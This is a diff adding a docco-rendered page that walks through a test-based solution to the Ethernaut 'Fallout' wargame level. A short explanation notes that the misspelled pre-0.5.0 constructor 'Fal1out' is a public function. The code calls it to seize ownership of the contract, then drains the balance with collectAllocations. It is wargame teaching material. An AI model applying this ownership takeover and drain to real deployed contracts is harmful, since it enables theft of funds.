@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 2: Fallout</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 2: Fallout</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">Contract</span>, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0x3d3314199b979330Fce92AEE9fD3b81637E40cf8&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;02_Fallout_Solution&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Fallout&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+  })</pre></div>
+      
+        
+        <p>In pre-0.5.0 Solidity, a constructor used to be a function bearing the same
+name as the contract (rather than being declared with the <code>constructor</code> keyword).
+<code>Fallout</code> has a function called <code>Fal1out</code> which looks like a constructor but
+isn’t one, because there’s a misspelling. It’s a plain public function which
+sets the owner to <code>msg.sender</code>.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;calls Fal1out with ether&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title class_">Fal</span>1out({<span class="hljs-attr">gasLimit</span>: <span class="hljs-number">1000000</span>})
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;has become owner&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> ownerAddr = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">owner</span>()
+    <span class="hljs-title function_">expect</span>(ownerAddr).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(signerAddress)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;withdraws the contract balance&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">collectAllocations</span>()
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
